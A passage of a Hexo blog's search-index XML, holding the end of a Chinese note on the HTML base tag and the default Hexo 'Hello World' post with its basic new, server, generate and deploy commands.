class="hljs-tag">&lt;/<span class="hljs-name">base</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span> 例子<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>这样就可以减少在后面使用相对路径的书写量，此时test即为在决定路径下进行寻找test文件]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>html</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/11/01/hello-world/"/>
    <url>/2024/11/01/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
